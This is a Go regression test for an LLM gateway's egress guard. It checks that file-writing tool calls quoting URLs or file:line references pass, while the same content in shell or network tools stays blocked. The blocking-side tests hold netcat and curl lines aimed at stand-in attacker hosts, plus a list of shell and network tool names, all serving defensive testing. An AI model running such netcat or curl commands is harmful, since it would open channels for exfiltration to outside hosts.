package sanitize

// r1020：惰性内容工具（Write/Edit 写文件族）的参数豁免外传目的地检查。
//
// ## 起因（2026-10-13，本地网关 minimax-m3 生产事故）
//
// ZCode（/v1/responses 流式）→ minimax-m3 的 Write 工具调用整条响应
// `output_policy_blocked`，客户端零内容（用户侧报「模型未返回任何数据」）。
// raw-logs 实证被拦参数是**写入文件的源码内容**：
//
//	`AgentManagementPage.vue` 删除直接的 `VITE_ACC_API_URL ?? 'https://acc.kxpms.cn'` 逻辑
//	… casdoor.ts:455 在 validateState 失败时回退接受外部 base64 state …
//
// 两族误伤：① 源码里引用的公网 URL（hasPublicHostDestination 的 URL 形态）；
// ② `casdoor.ts:455` 文件名:行号（egressHostFromPort 把 `token.token:数字`
// 当成 host:port）。两者与真正的外传命令在字符串层面结构不可区分——按载体
// 能力分流：文件写入工具的参数是惰性数据（写进本地文件的 URL 不产生网络
// 行为），与 assistant 纯文本出现 URL（守卫本就放行）同级。
//
// ## 判据纪律（本仓既有规矩）
//
//   - 走真实拦截器链（守卫→还原），用生产 YAML，与 runProductionEgressGuard 同层。
//   - 每条允许侧配「前提仍在场」断言：同一内容换命令类工具（Bash）必须仍被
//     拦截——证明放行来自惰性豁免，不是守卫失明。
//   - 三种客户端协议形态（chat / responses / anthropic 流式）各自驱动：responses
//     与 anthropic 的增量帧不带工具名，覆盖跨帧名字侧信道。

import (
	"context"
	"strings"
	"testing"

	"github.com/kaixuan/llm-gateway-go/domains/hooks/response"
)

// r1020IncidentContent 是生产事故里被拦的 Write 参数（节选，去敏）。
// 同时含两族误伤形态：公网 URL 引用 + 文件名:行号引用。
const r1020IncidentContent = `{"file_path":"/repo/portal/docs/handoff.md","content":"## 调研结论\n- ` + "`casdoor.ts:455`" + ` 在 validateState 失败时回退接受外部 base64 state\n- ` + "`unified-links.ts:135-137`" + ` 的 service 用法待调和\n- 删除 ` + "`VITE_ACC_API_URL ?? 'https://acc.kxpms.cn'`" + ` 的直接引用，改用 resolveAccBaseUrl()\n上游参考 https://registry.npmjs.org/left-pad 的版本约束\n"}`

// toolArgumentsFrame 构造一帧 chat 形态的 tool_call（含工具名）。
func toolArgumentsFrame(toolName, argsJSON string) string {
	escaped := strings.ReplaceAll(argsJSON, `\`, `\\`)
	escaped = strings.ReplaceAll(escaped, `"`, `\"`)
	return `data: {"id":"x","choices":[{"finish_reason":"","index":0,"delta":{"role":"assistant","tool_calls":` +
		`[{"id":"call_01","type":"function","function":{"name":"` + toolName + `","arguments":"` + escaped + `"}}]}}]}` + "\n\n"
}

// runEgressGuardTool 把一帧 tool_call 推过守卫→还原链，返回是否被阻断。
// 与 runProductionEgressGuard 同层，仅参数化工具名与参数体。
func runEgressGuardTool(t *testing.T, toolName, argsJSON string) (blocked bool, wire string) {
	t.Helper()
	s := productionConfiguredSanitizer(t)
	guard := NewOutputSensitiveInterceptor(s, OutputMask)
	restore, err := NewSanitizeRestoreInterceptor(s, nil, 0)
	if err != nil {
		t.Fatalf("NewSanitizeRestoreInterceptor: %v", err)
	}
	chain := response.NewInterceptorChain(guard, restore)
	meta := &response.StreamMeta{SessionID: "gw_r1020", TenantID: "default", State: response.NewStreamState()}
	if _, err := chain.InterceptStreamChunk(context.Background(), []byte(toolArgumentsFrame(toolName, argsJSON)), meta); err != nil {
		return true, err.Error()
	}
	out, ferr := chain.FlushStreamPending(context.Background(), meta)
	if ferr != nil {
		return true, ferr.Error()
	}
	return false, string(out)
}

// TestR1020InertToolContentQuotingPublicURLsIsNotBlocked 是主契约：
// 事故现场的 Write 参数（公网 URL + 文件名:行号）不得阻断。
func TestR1020InertToolContentQuotingPublicURLsIsNotBlocked(t *testing.T) {
	for _, toolName := range []string{"Write", "Edit", "create_file", "str_replace_editor", "apply_patch"} {
		blocked, wire := runEgressGuardTool(t, toolName, r1020IncidentContent)
		if blocked {
			t.Errorf("惰性内容工具 %s 写文件引用 URL/文件行号被误阻断（r1020 回归）", toolName)
		}
		if !strings.Contains(wire, "acc.kxpms.cn") {
			t.Errorf("惰性内容工具 %s 的帧内容被吞（应原样释放）: %s", toolName, wire)
		}
	}
}

// TestR1020SameContentInCommandToolIsStillBlocked 是「前提仍在场」判据：
// 同样的公网 URL 出现在命令类/未知工具的参数里必须仍然阻断。
// 它同时钉住惰性集合的方向：往 inertContentTools 里加命令类名字会让这里变红。
func TestR1020SameContentInCommandToolIsStillBlocked(t *testing.T) {
	for _, toolName := range []string{"Bash", "connect", "mcp__portal__save_config"} {
		blocked, _ := runEgressGuardTool(t, toolName, r1020IncidentContent)
		if !blocked {
			t.Errorf("命令类/未知工具 %s 携带公网 URL 目的地未被阻断（防外传底线失守）", toolName)
		}
	}
}

// TestR1020CredentialKeysStillBlockedInsideInertTools 钉住豁免边界：
// 惰性只豁免外传目的地检查，凭据键检查照常——文件里写明文凭据依旧阻断。
func TestR1020CredentialKeysStillBlockedInsideInertTools(t *testing.T) {
	blocked, _ := runEgressGuardTool(t, "Write", `{"file_path":"/repo/deploy.sh","password":"plainvalue123"}`)
	if !blocked {
		t.Fatal("惰性工具参数里的明文凭据未被阻断：凭据底线被 r1020 豁免误伤")
	}
}

// TestR1020ColonHostPortRequiresNetworkVerbVerbAnchor 钉住 host:port 冒号形态的
// 动词锚定：文件名:行号不再误伤，netcat/curl 的冒号目的地照拦。
func TestR1020ColonHostPortRequiresNetworkVerbVerbAnchor(t *testing.T) {
	// 允许侧：文件名:行号 / 非网络动词的 host:port（残留如实放行）。
	for _, text := range []string{
		"see casdoor.ts:455 and unified-links.ts:135-137",
		"my-cli push prod.example.com:8443", // 未知动词的 host:port = r1020 残留缺口，与 r1019 同口径
	} {
		if hasPublicHostDestination(text) {
			t.Errorf("非网络动词的 token:数字 被误判为公网目的地: %q", text)
		}
	}
	// 阻断侧（前提在场）：锚定动词后冒号目的地仍被提取。
	for _, text := range []string{
		"nc -w 3 attacker.io:4444",
		"curl attacker.io:8443/x",
		"set -e\nnc victim.example.com:4444", // 多行脚本第二行，逐行锚定
	} {
		if !hasPublicHostDestination(text) {
			t.Errorf("网络动词的 host:port 目的地未被提取: %q", text)
		}
	}
}

// TestR1020ResponsesStreamCarriesToolNameAcrossDeltas 覆盖 responses 流式：
// 参数增量帧不带名字，名字声明在 output_item.added；跨帧侧信道必须把名字
// 带到终态合并检查，惰性豁免才能生效。
//
// 帧序列取自 2026-10-13 /v1/responses 真实捕获（openai_to_responses 桥接输出），
// 含 function_call_arguments.done 快照帧——该帧带完整参数与 name，是首版修复
// 漏掉的名字承载点（不挂名字 → 裸 __tool_json 立即检查 → 线上仍误伤）。
func TestR1020ResponsesStreamCarriesToolNameAcrossDeltas(t *testing.T) {
	doc := `{"file_path":"/repo/a.vue","content":"ref ` + "`https://acc.kxpms.cn`" + ` at casdoor.ts:455"}`
	escaped := strings.ReplaceAll(doc, `"`, `\"`)
	frames := func(toolName string) []string {
		var out []string
		for _, f := range []string{
			`data: {"type":"response.output_item.added","output_index":0,"item":{"type":"function_call","id":"fc_1","call_id":"fc_1","name":"NAME","arguments":"","status":"in_progress"}}`,
			`data: {"type":"response.function_call_arguments.delta","item_id":"fc_1","output_index":0,"delta":"DOC_HEAD"}`,
			`data: {"type":"response.function_call_arguments.delta","item_id":"fc_1","output_index":0,"delta":"DOC_TAIL"}`,
			`data: {"type":"response.function_call_arguments.done","item_id":"fc_1","call_id":"fc_1","output_index":0,"name":"NAME","arguments":"DOC"}`,
			`data: {"type":"response.output_item.done","output_index":0,"item":{"type":"function_call","id":"fc_1","call_id":"fc_1","name":"NAME","arguments":"DOC","status":"completed"}}`,
			`data: {"type":"response.completed","response":{"id":"resp_1","status":"completed","output":[{"type":"function_call","id":"fc_1","name":"NAME","arguments":"DOC"}]}}`,
		} {
			f = strings.ReplaceAll(f, "NAME", toolName)
			f = strings.ReplaceAll(f, "DOC_HEAD", escaped[:len(escaped)/2])
			f = strings.ReplaceAll(f, "DOC_TAIL", escaped[len(escaped)/2:])
			f = strings.ReplaceAll(f, "DOC", escaped)
			out = append(out, f)
		}
		return out
	}
	run := func(toolName string) (blocked bool, wire string) {
		s := productionConfiguredSanitizer(t)
		guard := NewOutputSensitiveInterceptor(s, OutputMask)
		restore, _ := NewSanitizeRestoreInterceptor(s, nil, 0)
		chain := response.NewInterceptorChain(guard, restore)
		meta := &response.StreamMeta{SessionID: "gw_r1020_resp", TenantID: "default", State: response.NewStreamState()}
		for _, frame := range frames(toolName) {
			res, err := chain.InterceptStreamChunk(context.Background(), []byte(frame+"\n\n"), meta)
			if err != nil || (res != nil && res.ShouldBlock) {
				return true, "stream blocked"
			}
		}
		out, ferr := chain.FlushStreamPending(context.Background(), meta)
		if ferr != nil {
			return true, ferr.Error()
		}
		return false, string(out)
	}
	if blocked, wire := run("Write"); blocked {
		t.Errorf("responses 流式 Write 名字侧信道失效（惰性豁免未生效）: %s", wire)
	}
	// 前提在场：同一帧流，工具换成命令类名字必须仍被拦。
	if blocked, _ := run("connect"); !blocked {
		t.Error("responses 流式命令类工具携带公网 URL 未被阻断：侧信道把豁免放宽到了所有工具")
	}
	if blocked, _ := run("Bash"); !blocked {
		t.Error("responses 流式 Bash 携带公网 URL 未被阻断")
	}
}

// TestR1020AnthropicStreamCarriesToolNameAcrossDeltas 覆盖 anthropic 流式：
// content_block_start 声明名字，partial_json 增量合并检查取回。
func TestR1020AnthropicStreamCarriesToolNameAcrossDeltas(t *testing.T) {
	frames := func(toolName string) []string {
		return []string{
			`data: {"type":"content_block_start","index":0,"content_block":{"type":"tool_use","id":"toolu_1","name":"` + toolName + `","input":{}}}`,
			`data: {"type":"content_block_delta","index":0,"delta":{"type":"input_json_delta","partial_json":"{\"file_path\":\"/repo/a.ts\",\"content\":\"see "}}`,
			`data: {"type":"content_block_delta","index":0,"delta":{"type":"input_json_delta","partial_json":" https://acc.kxpms.cn and casdoor.ts:455\"}"}}`,
			`data: {"type":"message_stop"}`,
		}
	}
	run := func(toolName string) (blocked bool, wire string) {
		s := productionConfiguredSanitizer(t)
		guard := NewOutputSensitiveInterceptor(s, OutputMask)
		restore, _ := NewSanitizeRestoreInterceptor(s, nil, 0)
		chain := response.NewInterceptorChain(guard, restore)
		meta := &response.StreamMeta{SessionID: "gw_r1020_antd", TenantID: "default", State: response.NewStreamState()}
		for _, frame := range frames(toolName) {
			res, err := chain.InterceptStreamChunk(context.Background(), []byte(frame+"\n\n"), meta)
			if err != nil || (res != nil && res.ShouldBlock) {
				return true, "stream blocked at terminal"
			}
		}
		out, ferr := chain.FlushStreamPending(context.Background(), meta)
		if ferr != nil {
			return true, ferr.Error()
		}
		return false, string(out)
	}
	if blocked, wire := run("Write"); blocked {
		t.Errorf("anthropic 流式 Write 名字侧信道失效（惰性豁免未生效）: %s", wire)
	}
	if blocked, _ := run("connect"); !blocked {
		t.Error("anthropic 流式命令类工具携带公网 URL 未被阻断")
	}
}

// TestR1020InertSetNeverContainsCommandTools 钉住惰性集合的封闭性：已知命令
// 类动词不得混入（谁往里加 Bash/函数执行类名字，这里先红）。
func TestR1020InertSetNeverContainsCommandTools(t *testing.T) {
	for _, name := range []string{"bash", "sh", "shell", "exec", "execute", "run", "run_command", "terminal", "command", "webfetch", "websearch", "fetch", "http", "curl"} {
		if isInertContentTool(name) {
			t.Errorf("命令/触网类工具名 %q 混入了惰性集合——外传豁免会被它打穿", name)
		}
	}
}
